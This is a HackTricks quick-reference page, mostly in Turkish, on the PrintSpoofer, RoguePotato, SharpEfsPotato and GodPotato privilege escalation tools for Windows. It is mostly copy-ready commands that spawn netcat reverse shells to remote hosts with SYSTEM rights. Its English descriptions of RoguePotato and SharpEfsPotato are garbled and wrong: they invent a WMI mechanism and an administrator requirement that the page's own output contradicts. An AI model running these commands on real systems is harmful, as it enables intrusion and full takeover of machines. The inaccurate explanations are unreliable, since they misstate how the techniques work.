# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

{% hint style="warning" %}
**JuicyPotato**, Windows Server 2019 ve Windows 10 sürümü 1809'dan itibaren çalışmamaktadır. Bununla birlikte, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) aynı yetkileri kullanarak `NT AUTHORITY\SYSTEM` düzeyinde erişim sağlamak için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 ana bilgisayarlarında sahtekarlık yetkilerini kötüye kullanmak için kullanılan `PrintSpoofer` aracına ayrıntılı bir şekilde değinmektedir.
{% endhint %}

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
RoguePotato, also known as Potato, is a Windows local privilege escalation technique that takes advantage of the Windows Management Instrumentation (WMI) service. It exploits a vulnerability in the WMI service to execute arbitrary code with SYSTEM privileges.

The technique involves creating a malicious WMI event consumer that runs a specified command or script. When the WMI service is restarted, it will execute the malicious code with SYSTEM privileges. This allows an attacker to escalate their privileges from a low-privileged user to SYSTEM, gaining full control over the compromised system.

RoguePotato can be used in combination with other techniques, such as PrintSpoofer, to achieve even higher privileges. It is important to note that RoguePotato requires administrative privileges to create the malicious WMI event consumer.

To mitigate the risk of RoguePotato, it is recommended to apply the latest security updates and patches to the affected systems. Additionally, restricting administrative privileges and implementing strong access controls can help prevent unauthorized access and privilege escalation.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that leverages the EfsRpcOpenFileRaw function to perform a Local Privilege Escalation (LPE) attack on Windows systems. This attack exploits the EFS (Encrypting File System) service to gain SYSTEM-level privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Compile the C# code using a .NET compiler.
2. Execute the compiled binary on the target Windows system.

#### Requirements

To successfully execute the attack, the following conditions must be met:

- The target system must have the EFS service enabled.
- The attacker must have local administrator privileges on the target system.

#### Attack Process

The attack process involves the following steps:

1. The attacker runs the SharpEfsPotato binary on the target system.
2. SharpEfsPotato creates a named pipe and waits for the EFS service to connect to it.
3. The attacker triggers the EFS service to connect to the named pipe.
4. SharpEfsPotato sends a specially crafted request to the EFS service, exploiting a vulnerability in the EfsRpcOpenFileRaw function.
5. The EFS service processes the request and executes the attacker's payload with SYSTEM-level privileges.

#### Mitigation

To mitigate the risk of this attack, consider the following measures:

- Disable the EFS service if it is not required.
- Regularly apply security updates and patches to the Windows system.
- Limit the privileges of user accounts to minimize the impact of a potential LPE attack.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPatatesi

GodPotato, Windows işletim sistemlerinde yerel ayrıcalık yükseltme saldırıları gerçekleştirmek için kullanılan bir araçtır. Bu araç, Windows işletim sistemlerindeki bir zayıflıktan yararlanarak, düşük ayrıcalıklı bir kullanıcı hesabından yüksek ayrıcalıklı bir hesaba erişim sağlar.

GodPotato, Windows işletim sistemlerindeki bir hizmetin güvenlik açıklarını kullanarak yerel ayrıcalık yükseltme saldırıları gerçekleştirir. Bu saldırılar, hedef sisteme düşük ayrıcalıklı bir kullanıcı hesabıyla erişim sağlayan bir saldırganın, hedef sistemin yüksek ayrıcalıklı bir hesabına erişim elde etmesini sağlar.

GodPotato, özellikle RoguePotato ve PrintSpoofer gibi diğer araçlarla birlikte kullanıldığında etkili bir şekilde çalışır. Bu araçlar, hedef sisteme erişim sağlamak ve ardından yerel ayrıcalık yükseltme saldırıları gerçekleştirmek için birlikte kullanılabilir.

GodPotato, Windows işletim sistemlerinde yerel ayrıcalık yükseltme saldırıları gerçekleştirmek isteyen pentester'lar ve güvenlik araştırmacıları için önemli bir araçtır. Bu araç, hedef sistemin güvenlik açıklarını tespit etmek ve ayrıcalık yükseltme saldırıları gerçekleştirmek için kullanılabilir.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Referanslar
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
